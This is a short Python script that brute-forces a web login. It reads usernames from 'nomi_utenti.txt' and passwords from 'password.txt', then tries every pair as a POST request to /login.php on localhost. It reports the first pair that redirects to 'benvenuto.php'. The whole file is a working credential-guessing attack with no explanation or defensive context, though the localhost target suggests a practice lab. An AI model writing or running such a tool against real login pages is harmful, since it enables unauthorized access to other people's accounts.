import http.client as hc, urllib.parse as up

username_file = open("nomi_utenti.txt")
password_file = open("password.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()
stopit = False
for user in user_list:
    user =  user.rstrip()
    if(stopit): break
    for pwd in pwd_list:
        pwd = pwd.rstrip()
        if(stopit): break
        print(f"{user} - {pwd}")

        post_parameters = up.urlencode({'username': user, 'password': pwd, 'Submit': 'Submit'})
        # print(post_parameters)
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html, application/xhtml+xml"}
        conn = hc.HTTPConnection('127.0.0.1', 80)
        conn.request("POST", "/login.php", post_parameters, headers)
        response = conn.getresponse()

        if(response.getheader('location') == 'benvenuto.php'):
            print(f"logged with {user} - {pwd}")
            stopit = True
            
        